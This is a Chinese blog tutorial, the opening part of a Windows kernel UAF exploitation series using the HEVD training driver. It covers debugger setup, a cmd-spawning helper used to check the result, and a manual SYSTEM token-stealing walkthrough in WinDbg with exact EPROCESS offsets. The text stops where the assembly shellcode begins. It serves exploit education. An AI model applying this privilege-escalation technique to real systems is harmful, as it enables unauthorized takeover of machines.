**作者: wjllz  
博客链接: **
### 前言
Hello, 欢迎来到`windows kernel exploit`系列, 这是UAF系列的第一篇. 三篇的主要内容如下.
    [+] 第一篇: HEVD给的样例熟悉UAF
    [+] 第二篇: CVE-2015-0057在win8 X64下的利用
    [+] windows 10 x64下的UAF
关于第三篇的内容我还没有决定好, 最近在研究CVE-2018-8410, 如果分析的出来的话. 第三篇的内容我会给出CVE-2018-8410的分析报告.
如果失败的话, 我会挑选一下windows 10下的X64的UAF进行分析. 由于win10加了很多缓解措施, 所以那会是一个相当有趣的过程.
博客的内容我是倒着推的, 因为我喜欢有目的性的工作. 所以决定在最后再进行漏洞原理的分析。而原理的探讨主要是通过对补丁的探讨而完成.
在学习的过程中, 我给出了实验相应步骤的动态图. 希望能对您有所帮助.
### 0x01: 实验环境的搭建
由于是系列的第一节, 所以讲一下环境的搭建, 在经过漫长的犹豫之后, 我决定把环境的搭建制作成为一个gif图, 因为觉得动态的过程更容易理解一些.
    Tips: 本次环境的搭建环境. 仅在win7上面适用. win10(win 8 以后) 下因为驱动签名的问题会有一些小小的不同, 后面会给出win10的教程.
下面是对环境搭建步骤详解.
#### 1.1 环境要求
[+] 配置支持
    调试宿主机: windows 10 X64
    目标机子: windows 7 sp1 x86
    调试器: windbgx.exe
    辅助工具: virtuakD
#### 1.2 第一步
把virtualKD解压到宿主调试机C:\SoftWare, 将宿主机C:/software/target目录复制到target机子C:\下.
#### 1.3 第二步
打开target机器下的C:\target\vminstall.exe 点击yes. 电脑重启
#### 1.4 第三步
设置Vmcommon的调试器路径
#### 1.5 第四步
开始调试.
### 0x02: 漏洞利用
#### 2.1: 思路详解.
在我自己的学习过程中, 我喜欢把自己学的东西切成几大块， 假设为ABCD四个大块, 在B无法理解的情况下,
我能够去弄明白ACD就好.这样即使无法完成此次学习, 我也能保证能在此次的学习过程中得到有用的技能.
让我们来假设一下作为一个对UAF不理解的小白我们会把漏洞的利用过程切为那几个部分.
    [+] 编写shellcode(最终目的是为了运行shellcode)        
    [+] 分析漏洞                        
    [+] 根据漏洞原理, 伪造能够利用的数据(最终的结果是可以利用shellcode).
    [+] 触发漏洞
    [+] 运行cmd, 验证提权是否成功.
在进行上面的分析之后, 我们可以先做一些比较轻松的部分.
    [+] 运行cmd进行验证.
    [+] 编写Shellcode
#### 2.2: 运行cmd进行验证.
我相信有部分开始做内核的朋友可能会比较好奇为什么最后运行cmd, 输入`whoami`之后, 就能证明自己提权成功了, 很不幸的, 这是一段漫长的故事.
其实也还是很简单的. 原理如下.
    [+] 我们运行了exp, exp记作进程A
    [+] EXP里面创建一个cmd子进程, 记作子进程B
    [+] 子进程会默认继承父进程的权限
    [+] 父进程提权成功, 可以在子进程体现.(类似于老子帅不帅可以从儿子那里得到相应的推测)
##### 2.2.1: 编写创建cmd子进程程序.
这一部分的代码感谢小刀师傅,
来源于他的[博客](https://xiaodaozhi.com/)和[github](https://github.com/leeqwind).
在他的`博客`和`github`上面我学习到了很多的有用的东西.
    //创建cmd子进程的代码.
    static
    VOID xxCreateCmdLineProcess(VOID)
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
很多时候, 我觉得有些细节其实是可以不用太在意的. 你可以帮他当作拖油瓶, 只是附带的产物, 比如上面的si的赋值之类的. 让我们关注一下重点函数.
#### 2.2.2: CreateProcessW函数
CreateProcessW创建一个子进程, 在MSDN上面你可以的到详细的解释. 我们列出重要参数的详细解释.
    [+] wzFilePath --> 创建的进程名称, cmd
#### 2.2.2: 调用cmd子进程
我们在main函数当中进行调用. main函数现在的代码如下.
    // main函数的代码.
    int main()
    {
        xxCreateCmdLineProcess();    //调用cmd
        return 0;
    }
#### 2.2.3: 运行的结果
运行的结果如下图.
![start
cmd](https://images.seebug.org/content/images/2019/03/29/1553848578000-blog_1.gif-w331s)
我们发现我们现在的提权没有成功, 这是肯定的. 因为我们并没有进行漏洞的利用.
#### 2.3: 编写shellcode的代码
作为一个有灵魂的内核选手, 这个地方的shellcode我们当然采用汇编编写. 编写之前, 我们继续对我们所学的东西进行分块.
    [+] ShellCode目的: 进行提权
    [+] 提权手段: 将system进程的Token赋值给cmd
    [+] 提权的汇编步骤:
        ==> 找到system的Token, 记作TokenSys
        ==> 找到cmd的Token. 记作TokenCmd
        ==> 实现TokenCmd = TokenSys
##### 2.3.1: ShellCode提权方法的验证.
okok, 作为一个内核选手, 我们深知调试器永远不会骗人. 所以我们可以通过调试器来帮助我们验证一下我们的思路是否正确.
###### 2.3.1.0: 找到System进程的TokenSys
运行如下命令:
    !dml_proc
我们能得到关于system如下的结果.
    kd> !dml_proc
        Address  PID  Image file name
        857bd920 4    System         
        86357a10 120  smss.exe       
        86385030 178  csrss.exe      
        86be3b90 1ac  wininit.exe    
        863e4b68 1b4  csrss.exe      
        873f1d40 1d8  winlogon.exe   
        ...
解释:
    PID:0004 --> system在win7下PID永远为4
    PROCESS: 857bd920 -- 进程起始的地址.
接着我们运行如下的命令, 查看system进程的Token.
    kd> dt nt!_EX_FAST_REF 857bd920 +f8
            +0x000 Object           : 0x8940126f Void
            +0x000 RefCnt           : 0y111
            +0x000 Value            : 0x8940126f -- value是Token的值.
###### 2.3.1.1: 找到cmd进程的TokenCmd
与找到TokenSys的方法类似, 在虚拟机里面运行一个cmd. 我们可以通过相同的方式找到TokenCmd
    kd> dt nt!_EX_FAST_REF 871db030 +f8
        +0x000 Object           : 0x967ee085 Void
        +0x000 RefCnt           : 0y101
        +0x000 Value            : 0x967ee085 -- value是Token的值.
###### 2.3.1.2: 进行TokenCmd = TokenSys.
这一部分, 我们采用调试器辅助完成. Token存放在进程偏移f8处, 我们可以把TokenCmd按照如下的命令重新赋值.
    ed 871db030+f8(TokenCmd的存放地址) 8940126f(TokenSys)
此时我们再对cmd的Token进行解析. 发现Token的值已经和Sytem的Token出奇一致.
    kd> dt nt!_EX_FAST_REF 871db030 +f8
        +0x000 Object           : 0x8940126f Void
        +0x000 RefCnt           : 0y111
        +0x000 Value            : 0x8940126f
此时我们运行cmd的`whoami`命令.
[
##### 2.3.2: 提权的汇编实现.
汇编实现的整体代码如下. 关键点我会给出注释, 如果你需要更详细的解释, 你可以在这里找到答案. (Tips:
汇编代码只是对我们上面手工做的过程的一次模仿. 别畏惧它)
    // 提权的汇编代码.
    void ShellCode()
    {
        _asm 
        {
            nop
            nop